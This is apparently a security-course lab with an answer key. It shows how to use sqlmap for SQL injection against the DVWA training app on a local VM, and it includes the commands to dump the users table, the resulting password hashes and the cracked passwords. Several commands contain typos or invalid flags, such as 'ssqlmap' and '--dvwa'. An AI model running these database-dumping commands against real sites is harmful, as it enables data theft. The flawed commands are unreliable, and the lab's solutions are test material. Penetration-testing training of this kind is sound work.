## Dumping Databases with sqlmap

### Instructions

Using your Linux VM turn on the DVWA by typing: `dvwa_start`

- Then, follow the instructions below.

Browse the site, and look at the URL bars. Find the page that accepts a GET query parameter.
  - Record this URL when you find it.
  - **Solution**: `http://youripaddress/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`

Use SQLMap to test the URL for a SQL injection vulnerability.
  - **Solution**: `http://youripaddress/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`

Next, use a UNION-based injection to perform the following tasks, and 
  - Grab the database banner
  - List all available databases
  - List the tables of the `dvwa` database
  - List the columns of the `users` table
  - Dump the `login` and `password` columns of the `users` table

  ```bash
    > Banner = sqlmap -u "http://youripaddress/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your session ID; security=low"--banner
    > Databases = ssqlmap -u "http://youripaddress/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your session ID; security=low" --dvwa
    > Tables = sqlmap -u "http://youripaddress/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your session ID; security=low" --tables
    > Columns of the users table =  sqlmap -u "http://youripaddress/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your session ID; security=low" --current-db dvwa --dump
    > cat users.csv
  ```

Record the results of your information gathering below.
  - **Banner**

    ```bash
    web server operating system: Linux Debian
    web application technology: Apache 2.4.25
    back-end DBMS: MySQL >= 5.0
    ```

  - **Databases**: `dvwa` and `information_schema`
  - **Tables in `dvwa`**: `guestbook`, and `users`
  - **Columns in `users`**: `user_id`, `avatar`, `user`, `password`, `last_name`, `first_name`, and `last_login`. 

How many users are registered on this site? What are their username/passwords hashes?
  - **Solution**: There are five registered users thier names and password hashes are: 
```  
admin   | 5f4dcc3b5aa765d61d8327deb882cf99 
gordonb | e99a18c428cb38d5f260853678922e03 
1337    | 8d3533d75ae2c3966d7e0d4fcc69216b 
pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 
smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 
```

What is one of the passwords that you dumped?
  - **Solution**: Cracking with SQLMap or simply Googling reveal that the passwords are: 

```  
admin   | password
gordonb | abc123
1337    | charley
pablo   | letmein
smithy  | password
```
